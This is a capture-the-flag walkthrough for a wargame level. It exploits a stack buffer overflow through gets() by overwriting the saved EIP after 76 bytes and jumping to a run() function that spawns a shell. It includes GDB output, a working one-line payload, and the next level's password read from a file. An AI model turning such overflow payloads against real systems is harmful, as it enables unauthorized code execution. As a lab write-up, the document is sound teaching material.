# Level 1 Walkthrough

## Initial Analysis
1. Log into the `level1` account and copy the ELF locally.
2. Use GDB (with GEF or pwndbg) to inspect the stack setup.

```bash
$ gdb ./level1
gef➤ b *main
gef➤ r
gef➤ x/10i $eip
```

### Main Function Disassembly
```asm
0x8048480 <main>:    push   ebp
0x8048481 <main+1>:  mov    ebp, esp
0x8048483 <main+3>:  and    esp, 0xfffffff0
0x8048486 <main+6>:  sub    esp, 0x50          ; 80 bytes stack frame
0x8048489 <main+9>:  lea    eax, [esp+0x10]     ; buffer pointer
0x804848d <main+13>: mov    dword ptr [esp], eax
0x8048490 <main+16>: call   gets@plt            ; unbounded read
```
Observations:
- The source code declares a 76-byte buffer. The assembly shows `0x50 - 0x10 = 0x40` (64 bytes). This difference could be
probably due to compiler optimizations and stack alignment. The empirical offset (76 bytes) is what matters for
exploitation.
- Because `gets` never checks bounds, anything beyond 76 bytes overwrites the saved EIP.

## Exploitation Process

### 1. Measure the Offset
Using `pattern create 200` and `pattern search $eip` confirms the offset to EIP is exactly **76 bytes**, matching the
buffer size declared in `source.c`.

### 2. Identify the Win Function
`info functions` reveals the `run()` function at `0x8048444`. It spawns a shell via `system("/bin/sh")`, making it the
ideal target to jump to. Disassembly:
```asm
run:
  push   ebp
  mov    ebp, esp
  sub    esp, 0x18
  fwrite("Good... Wait what?\n", 1, 0x13, stdout);
  system("/bin/sh");
  leave
  ret
```

### 3. Craft the Payload
```
payload = b"A" * 76 + p32(0x8048444)
```
Pipe it into the binary or send via a pwntools script.

### 4. Grab the Flag
Once `run` executes, we land in a shell running as `level2`.
```bash
$ (python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*76 + struct.pack("<I", 0x8048444))') | ./level1
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Summary
1. Vulnerability: stack buffer overflow via `gets`.
2. Offset to EIP: 76 bytes.
3. Redirect execution to `run()` at `0x8048444`.
4. Shell → read the next password.
